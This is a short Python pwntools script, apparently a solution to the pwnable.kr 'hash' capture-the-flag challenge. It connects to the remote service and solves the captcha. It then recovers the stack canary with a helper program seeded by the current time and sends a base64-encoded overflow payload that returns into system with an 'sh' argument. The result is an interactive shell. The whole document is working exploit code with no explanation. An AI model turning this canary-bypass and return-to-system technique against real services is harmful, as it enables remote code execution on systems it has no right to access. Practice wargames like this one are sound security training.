from pwn import *
import time,os

def DEBUG():
	gdb.attach(r, '''
					b *0x8049187
					c
					'''
		)

system = 0x08049187
g_buf = 0x0804B0E0

#r = process('./hash')
r = remote('pwnable.kr', 9002)
t = int(time.time())
r.recvuntil("captcha : ")
captcha = r.recvline(timeout=10).strip()
r.sendline(captcha)

# calculate canary
canary = "0x" + os.popen("./canary " + str(t) + " " + captcha).read().strip()

payload = b64e('a'*512 + p32(int(canary, 16)) + 'a'*12 + p32(system) + p32(g_buf+537*4/3) + '=') + "sh\0\0"
r.sendline(payload)
r.interactive()